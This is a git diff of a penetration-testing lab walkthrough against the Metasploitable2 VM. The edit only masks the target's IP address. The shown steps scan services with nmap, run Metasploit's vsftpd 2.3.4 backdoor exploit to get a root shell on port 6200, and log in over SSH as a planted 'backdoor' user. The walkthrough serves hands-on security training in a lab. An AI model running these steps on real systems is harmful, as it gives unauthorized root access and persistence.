@@ -10,11 +10,11 @@ This markdown contains a detailed walkthrough of the steps taken during this pro
 - Verified network connectivity using the following command from Kali:
 
   -> bash
-      - ping 192.168.56.102
+      - ping 192.168.xxx.xxx
 
 ## 2. Scan and Identify Open Ports
   -> bash
-      - nmap -sV 192.168.56.102 
+      - nmap -sV 192.168.xxx.xxx
       (This will show you available services (like FTP, Samba) on the target (Metasploitable2) VM.)
 
 ## 3. Exploit: vsftpd_234_backdoor
@@ -23,7 +23,7 @@ This markdown contains a detailed walkthrough of the steps taken during this pro
   Inside Metasploit: 
   -> bash
       - use exploit/unix/ftp/vsftpd_234_backdoor
-      - set RHOSTS 192.168.56.102
+      - set RHOSTS 192.168.xxx.xxx
       - run
 
   After execution, you’ll get a root shell via port 6200. You can confirm access with:
@@ -40,7 +40,7 @@ This markdown contains a detailed walkthrough of the steps taken during this pro
 ## 5. SSH into Backdoored User
   From your Kali terminal:
   -> bash
-      - ssh backdoor@192.168.56.102
+      - ssh backdoor@192.168.xxx.xxx
 
   Use the password you set and confirm shell access:
   -> bash
